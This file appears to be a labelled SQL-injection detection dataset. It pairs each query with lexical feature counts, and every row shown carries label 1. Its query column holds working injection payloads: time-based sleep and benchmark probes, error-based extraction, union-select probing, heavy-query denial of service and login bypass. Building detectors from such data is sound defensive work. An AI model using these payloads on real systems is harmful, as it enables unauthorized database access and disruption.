Query,Data,Singlequotes,Doublequotes,Punctuations,1-linecmt,Mulline-cmt,Spaces,Safekywrd,Harmflkywrd,Percentages,Log_oprtr,Operator,Nulls,Hex-dec,Db_info,Roles,Ntwr_cmds,Lang_cmds,Alphabets,Digits,Spl_char,Label
1' or sleep  (  5  )  #,0,1,0,3,0,0,7,1,1,0,1,1,0,0,0,0,1,0,7,2,1,1
"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",0,0,4,10,0,0,14,2,1,0,3,4,0,0,0,0,1,0,21,2,4,1
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # zcyc",0,0,0,10,0,0,29,2,7,0,1,3,0,0,0,7,0,1,112,12,0,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""tbcc""  =  ""tbcc",0,0,3,12,0,0,19,6,3,0,6,8,0,0,0,0,0,1,73,3,3,1
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'xfmq'  =  'xfmq",0,4,0,14,0,0,24,8,0,0,9,12,0,0,0,5,0,1,74,10,4,1
"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",0,1,0,9,0,0,19,1,1,0,2,6,0,1,0,0,0,0,26,30,1,1
end and    (    (   6874  =  6874,0,0,0,2,0,0,7,1,0,0,2,3,0,0,0,0,0,0,6,8,0,1
1'  )   order by 1--,0,1,0,4,0,0,5,2,0,0,1,3,0,0,0,0,0,0,7,2,1,1
"-2071 union all select 4753,4753--",0,0,0,4,0,0,5,4,0,0,1,4,0,0,0,0,0,1,14,12,0,1
-9217 or 9323  =  9323#,0,0,0,1,0,0,5,1,0,0,1,3,0,0,0,0,0,0,2,12,0,1
select   (  case when   (  7019  =  1998  )   then 7019 else 7019*  (  select 7019 from mysql.db  )   end  )  #,0,0,0,7,0,0,22,2,1,0,0,2,0,0,0,0,0,2,42,20,0,1
"-9175'   )    )    union all select 6174,6174,6174,6174--",0,1,0,9,0,0,7,4,0,0,1,4,0,0,0,0,0,1,14,20,1,1
1%'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',0,4,0,40,0,0,78,4,13,2,5,19,0,0,0,0,0,1,81,47,4,1
|,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1
"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",0,0,0,11,0,0,29,3,4,0,3,6,0,0,0,0,0,1,74,17,0,1
"1' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,3,0,14,0,0,18,3,1,0,5,9,0,0,0,0,0,0,32,15,3,1
-3677'   )    )    or 1939  =  4484,0,1,0,4,0,0,7,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
"""hi""""  )   or   (  """"a""""  =  """"a""",0,0,10,12,0,0,7,1,0,0,1,2,0,0,0,0,0,0,6,0,10,1
"1""  )   where 9545  =  9545 and 9198  =  9198--",0,0,1,4,0,0,10,1,0,0,2,6,0,0,0,0,0,0,8,17,1,1
"1"" and 9468  =  7105--",0,0,1,3,0,0,5,1,0,0,2,5,0,0,0,0,0,0,3,9,1,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'kyos' like 'kyos",0,5,0,16,0,0,20,5,1,0,6,7,0,0,0,0,0,1,50,10,5,1
"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",0,3,0,13,0,0,22,4,1,0,5,7,0,0,0,0,0,0,44,15,3,1
"1%'  )   union all select null,null#",0,1,0,3,0,0,6,4,0,1,1,2,2,0,0,0,0,1,22,1,1,1
" select * from users where id  =  1 or ""\#"" or 1  =  1 -- 1",0,0,2,4,1,0,16,3,0,0,2,7,0,0,0,1,0,1,26,4,3,1
"1"" where 9669  =  9669",0,0,1,1,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'gzlz' like 'gzlz",0,4,0,13,0,0,23,8,3,0,9,11,0,0,0,0,0,1,80,8,4,1
1 where 4940  =  4940,0,0,0,0,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,0,1
1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'ejnt' like 'ejnt,0,4,0,12,0,0,25,4,1,0,4,5,0,1,0,0,0,1,46,13,4,1
select   (  case when   (  9619  =  8679  )   then 1 else 9619*  (  select 9619 from master..sysdatabases  )   end  )  --,0,0,0,10,0,0,22,3,3,0,0,4,0,0,0,0,0,2,53,17,0,1
-2055  )   or 3038  =  3038,0,0,0,2,0,0,6,1,0,0,1,3,0,0,0,0,0,0,2,12,0,1
1'  )   as chla where 6098  =  6098,0,1,0,2,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,0,3,0,8,0,0,12,2,1,0,2,3,0,0,0,0,1,1,22,1,3,1
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",0,1,0,28,0,0,57,16,1,0,5,9,0,2,0,0,0,6,99,55,1,1
-1375'   )    )     )   or   (  1226  =  9648  )  *9648 and    (    (     (  'kfoy' like 'kfoy,0,4,0,13,0,0,18,3,0,0,4,7,0,0,0,0,0,0,17,16,4,1
"-6520%""  )   order by 1#",0,0,1,3,0,0,5,2,0,1,1,3,0,0,0,0,0,0,7,5,1,1
"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",0,0,0,8,0,0,18,7,0,0,7,9,0,0,0,5,0,1,63,10,0,1
"1""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,0,1,9,0,0,15,1,1,0,2,3,0,0,0,0,1,0,11,10,1,1
1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   5171  =  5171,0,0,0,12,0,0,25,4,1,0,4,6,0,0,0,0,1,2,31,10,0,1
1  )   where 4548  =  4548 and 9198  =  9198--,0,0,0,3,0,0,10,1,0,0,2,6,0,0,0,0,0,0,8,17,0,1
"1%'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",0,4,0,32,0,0,47,6,1,2,4,10,0,3,0,0,0,4,52,71,4,1
1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,0,1,0,11,0,0,26,3,2,0,1,3,0,0,0,0,1,2,38,10,1,1
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",0,0,2,5,1,0,16,3,0,0,2,7,0,0,0,1,0,1,26,4,2,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'fuyl'  =  'fuyl",0,3,0,13,0,0,20,2,3,0,2,4,0,0,0,0,0,1,80,3,3,1
"1%""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",0,0,1,16,0,0,26,1,0,1,2,12,0,0,0,0,0,0,37,15,1,1
1' where 2690  =  2690,0,1,0,1,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"iif  (  2869  =  9448,1,1/0  )  ",0,0,0,4,0,0,6,0,0,0,0,2,0,0,0,0,0,0,3,11,0,1
"1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,0,0,16,0,0,23,0,1,0,0,0,0,2,0,0,0,0,50,23,0,1
1'||  (  select 'aevx' from dual where 9999  =  9999,0,3,0,4,0,0,10,1,0,0,0,3,0,0,0,0,0,1,23,9,3,1
1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'qrtf'  =  'qrtf,0,4,0,14,0,0,23,3,1,0,4,6,0,0,0,0,1,1,31,10,4,1
x' OR full_name LIKE '%Bob%,0,2,0,2,0,0,5,2,0,2,2,4,0,0,0,0,0,0,18,0,2,1
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'wjwn'  =  'wjwn",0,4,0,28,0,0,43,6,1,0,4,8,0,3,0,0,0,4,60,71,4,1
"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",0,0,0,5,0,0,12,1,0,0,0,1,0,0,0,0,0,1,33,8,0,1
"1%'  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,1,0,13,0,0,21,2,3,1,1,6,0,0,0,0,0,1,71,8,1,1
"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",0,0,0,27,0,0,51,5,7,0,3,10,1,0,0,1,0,1,107,34,0,1
select   (  case when   (  4690  =  4373  )   then 4690 else 1/  (  select 0  )   end  )  --,0,0,0,8,0,0,20,2,1,0,0,4,0,0,0,0,0,2,31,14,0,1
select   (  case when   (  3336  =  9781  )   then 3336 else 1/  (  select 0  )   end  )  --,0,0,0,8,0,0,20,2,1,0,0,4,0,0,0,0,0,2,31,14,0,1
"1' and elt  (  9371  =  8882,8882  )   and 'vurh'  =  'vurh",0,4,0,7,0,0,12,2,0,0,4,6,0,0,0,0,0,0,17,13,4,1
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",0,0,0,3,1,0,17,5,1,0,1,7,0,0,1,1,0,2,42,4,1,1
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",0,4,0,32,0,0,62,18,1,0,7,11,0,2,0,0,0,6,113,55,4,1
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ylit' like 'ylit",0,4,0,42,0,0,73,4,8,0,4,15,2,0,0,0,0,1,119,35,4,1
-6500'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'padu' like 'padu,0,4,0,11,0,0,16,3,0,0,4,7,0,0,0,0,0,0,17,16,4,1
"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",0,0,4,16,0,0,28,2,0,0,4,12,0,0,0,0,0,0,48,16,4,1
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",0,0,0,3,1,0,15,4,1,0,0,7,1,0,1,1,0,2,44,2,0,1
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'weof'  =  'weof",0,4,0,46,0,0,77,3,8,0,3,15,2,0,0,0,0,1,115,35,4,1
-4961'  )   or 3038  =  3038,0,1,0,3,0,0,6,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
"1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'zovb' like 'zovb",0,6,0,21,0,0,27,5,1,0,8,10,0,0,0,0,0,0,47,15,6,1
1  )   waitfor delay '0:0:5',0,2,0,5,0,0,5,1,1,0,1,1,0,0,0,0,1,0,12,4,2,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   6977  =  6977",0,0,0,7,0,0,21,2,4,0,2,4,0,0,0,0,0,1,72,12,0,1
"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl",0,0,4,32,0,0,56,6,7,0,5,13,1,0,0,1,0,1,118,34,4,1
select   (  case when   (  5847  =  2826  )   then 5847 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,0,0,0,10,0,0,29,3,3,0,1,5,0,0,0,0,0,2,56,14,0,1
"1'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",0,1,0,12,0,0,20,7,0,0,6,10,0,0,0,5,0,1,62,10,1,1
"-9638   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  3679  =  3679",0,0,0,10,0,0,18,2,0,0,3,6,0,0,0,0,0,0,8,24,0,1
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # dwxl",0,0,0,35,0,0,77,4,14,0,3,15,0,0,0,0,0,2,96,47,0,1
1   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,0,0,0,9,0,0,17,2,1,0,2,5,0,0,0,0,1,1,20,10,0,1
"1'||  (  select 'tmsj' where 2971  =  2971 union all select null,null,null,null,null,null,null,null,null,null#",0,3,0,13,0,0,12,5,0,0,1,4,10,0,0,0,0,2,69,9,3,1
"1""   )    )     )   union all select null,null,null,null--",0,0,1,9,0,0,8,4,0,0,1,3,4,0,0,0,0,1,30,1,1,1
"-9289   )    )    or make_set  (  5101  =  9919,9919  )   and    (    (   8977  =  8977",0,0,0,8,0,0,16,4,0,0,3,6,0,0,0,0,0,0,12,24,0,1
"-9347'  )   union all select 3884,3884#",0,1,0,4,0,0,6,4,0,0,1,2,0,0,0,0,0,1,14,12,1,1
"-1263""  )   or 9323  =  9323#",0,0,1,3,0,0,6,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",0,0,0,11,0,0,5,4,0,0,1,4,0,0,0,0,0,1,14,40,0,1
1'  )   as sjij where 8659  =  8659,0,1,0,2,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
"1  )   where 3915  =  3915 union all select null,null,null,null#",0,0,0,4,0,0,10,4,0,0,1,2,4,0,0,0,0,1,35,9,0,1
"-1174"" union all select 4303,4303,4303,4303#",0,0,1,5,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,20,1,1
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",0,0,0,5,1,0,17,4,1,0,0,5,1,0,1,1,0,2,44,2,1,1
"-7307'   )    )    union all select 5215,5215,5215,5215--",0,1,0,9,0,0,7,4,0,0,1,4,0,0,0,0,0,1,14,20,1,1
"1"" where 6200  =  6200 and elt  (  1210  =  1210,sleep  (  5   )    )   --",0,0,1,8,0,0,16,1,1,0,2,6,0,0,0,0,1,0,16,18,1,1
 or ''  =  ',0,3,0,3,0,0,4,1,0,0,1,2,0,0,0,0,0,0,2,0,3,1
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'cipk'  =  'cipk",0,4,0,19,0,0,25,3,1,0,4,6,0,3,0,0,0,1,48,35,4,1
"1  )   where 9213  =  9213 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,0,0,12,0,0,25,2,3,0,2,7,0,0,0,0,0,1,77,16,0,1
"1   )    )    as rwsn where 9946  =  9946 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",0,0,0,19,0,0,30,2,2,0,1,5,0,3,0,0,0,1,47,43,0,1
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",0,0,1,10,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,40,1,1
"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,0,0,4,22,0,0,28,4,1,2,3,7,0,3,0,0,0,2,36,39,4,1
select   (  case when   (  3217  =  8421  )   then 3217 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,0,0,0,10,0,0,29,3,3,0,1,5,0,0,0,0,0,2,56,14,0,1
"1%""  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,1,23,0,0,37,2,5,1,3,13,1,0,0,0,0,0,53,25,1,1
"1'   )    )    as icik where 1440  =  1440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,1,0,14,0,0,28,2,4,0,2,7,0,0,0,0,0,1,83,16,1,1
1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  3945  =  3945,0,4,0,10,0,0,28,4,2,0,4,10,0,0,0,0,0,1,56,23,4,1
"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'wzdo'  =  'wzdo",0,4,0,34,0,0,54,13,2,0,9,13,0,2,0,0,0,3,108,35,4,1
1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,0,1,0,6,0,0,14,1,2,0,2,5,0,0,0,0,1,0,19,10,1,1
"1'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,1,0,30,0,0,49,2,7,0,3,16,2,0,0,0,0,0,72,27,1,1
"1""   )    )    as upvg where 4826  =  4826",0,0,1,3,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
-3436  )   or 9281  =  3172,0,0,0,2,0,0,6,1,0,0,1,3,0,0,0,0,0,0,2,12,0,1
"1""  )   as uyms where 6210  =  6210 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",0,0,1,37,0,0,78,2,2,0,2,27,0,0,0,0,0,1,92,57,1,1
-4761 order by 1--,0,0,0,3,0,0,4,2,0,0,1,4,0,0,0,0,0,0,7,5,0,1
"iif  (  1878  =  2513,1,1/0  )  ",0,0,0,4,0,0,6,0,0,0,0,2,0,0,0,0,0,0,3,11,0,1
"1"" where 2365  =  2365 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,0,1,12,0,0,24,2,3,0,2,7,0,0,0,0,0,1,77,16,1,1
"1%""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""%""  =  """,0,4,4,14,0,0,28,4,2,2,4,12,0,0,0,0,0,1,56,15,8,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""ulfr"" like ""ulfr",0,0,3,15,0,0,27,3,0,0,3,9,0,0,0,0,0,1,63,10,3,1
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",0,0,2,6,1,0,19,3,0,0,2,7,0,0,0,1,0,1,26,4,2,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""%""  =  """,0,0,3,9,0,0,20,2,4,1,2,5,0,0,0,0,0,1,72,4,3,1
"1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,0,0,17,0,0,28,0,1,0,0,1,0,2,0,0,0,0,55,31,0,1
"-8153' where 2436  =  2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",0,1,0,11,0,0,9,4,0,0,1,3,0,0,0,0,0,1,19,52,1,1
-7034'   )    )     )   union all select 4023#,0,1,0,5,0,0,8,4,0,0,1,2,0,0,0,0,0,1,14,8,1,1
"1""  )   where 1416  =  1416 union all select null,null,null#",0,0,1,4,0,0,10,4,0,0,1,2,3,0,0,0,0,1,31,9,1,1
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",0,1,0,9,0,0,17,2,0,0,1,3,0,0,0,0,0,1,31,13,1,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",0,3,0,17,0,0,24,3,2,1,4,6,1,0,0,0,0,1,41,14,3,1
"1""  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,0,1,13,0,0,21,2,3,0,1,5,0,0,0,0,0,1,71,8,1,1
"1%' union all select null,null,null,null,null,null,null#",0,1,0,7,0,0,5,4,0,1,1,2,7,0,0,0,0,1,42,1,1,1
1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'nbxw'  =  'nbxw,0,4,0,10,0,0,23,3,1,0,3,5,0,1,0,0,0,1,42,13,4,1
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",0,0,0,9,0,0,5,4,0,0,1,4,0,0,0,0,0,1,14,32,0,1
-5742' where 1314  =  1314 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,0,5,0,12,0,0,27,3,2,0,1,10,0,0,0,0,0,1,57,26,5,1
select   (  case when   (  8234  =  2498  )   then 8234 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,0,0,0,10,0,0,29,3,3,0,1,5,0,0,0,0,0,2,56,14,0,1
1  )   rlike   (  select   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    and   (  4427  =  4427,0,0,0,8,0,0,25,3,1,0,3,5,0,1,0,0,0,1,34,21,0,1
"admin"" or 1  =  1--",0,0,1,3,0,0,5,2,0,0,2,5,0,0,0,1,0,0,7,2,1,1
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",0,4,0,27,0,0,43,3,5,0,5,13,1,0,0,0,0,0,64,27,4,1
"1%'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,1,0,11,0,0,23,2,4,1,1,6,0,0,0,0,0,1,71,9,1,1
"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""hbgv""  =  ""hbgv",0,0,4,24,0,0,37,5,1,0,4,7,0,3,0,0,0,3,55,32,4,1
1'+  (  select 'vnue' where 5807  =  5807,0,3,0,4,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,3,1
1' where 8635  =  8635 order by 1--,0,1,0,3,0,0,8,2,0,0,1,4,0,0,0,0,0,0,12,10,1,1
select * from users where id  =  1 %$ . or 1  =  1 -- 1,0,0,0,3,1,0,16,2,0,1,1,7,0,0,0,1,0,1,24,4,0,1
1'  )   where 2227  =  2227,0,1,0,2,0,0,6,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"1"" and 5205  =  9975#",0,0,1,1,0,0,5,1,0,0,2,3,0,0,0,0,0,0,3,9,1,1
"-8472'  )   where 3340  =  3340 or make_set  (  1752  =  9905,9905  )  --",0,1,0,8,0,0,14,3,0,0,1,6,0,0,0,0,0,0,14,24,1,1
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",0,0,0,6,1,0,16,4,1,0,0,6,0,0,0,1,0,2,40,3,0,1
-3597'   )    )    order by 1--,0,1,0,6,0,0,6,2,0,0,1,4,0,0,0,0,0,0,7,5,1,1
"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   ",0,0,1,7,0,0,19,2,1,0,1,2,0,1,0,0,0,1,31,13,1,1
"-6305""   )    )     )   or 8097  =  2048 and    (    (     (  ""euyy"" like ""euyy",0,0,4,11,0,0,15,3,0,0,4,6,0,0,0,0,0,0,17,12,4,1
1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  #,0,1,0,10,0,0,22,4,1,0,2,3,0,0,0,0,1,2,43,2,1,1
select   (  case when   (  3444  =  8424  )   then 3444 else 3444*  (  select 3444 from information_schema.character_sets  )   end  )  #,0,0,0,7,0,0,22,7,2,0,2,4,0,0,0,0,0,2,65,20,0,1
1   )    )     )   and 9198  =  9198--,0,0,0,5,0,0,8,1,0,0,2,5,0,0,0,0,0,0,3,9,0,1
"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",0,1,0,10,0,0,9,5,0,0,2,4,7,0,0,0,0,1,55,1,1,1
"1%""   )    )    and 9198  =  9198--",0,0,1,5,0,0,7,1,0,1,2,6,0,0,0,0,0,0,3,9,1,1
